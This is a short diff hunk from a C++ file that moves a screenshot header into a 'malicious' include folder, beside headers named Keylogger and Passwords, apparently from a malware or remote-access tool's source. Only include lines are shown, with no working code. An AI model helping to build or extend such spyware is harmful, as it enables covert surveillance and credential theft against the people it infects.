@@ -20,7 +20,7 @@ using namespace Network;
 #include "InhibitionCore.hpp"
 #include "ServerAbstractFunction.hpp"
 #include "ProgramStart.hpp"
-#include "Screenshot.hpp"
+#include <malicious/Screenshot.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Passwords.hpp>
 #include <common/Logger.hpp>
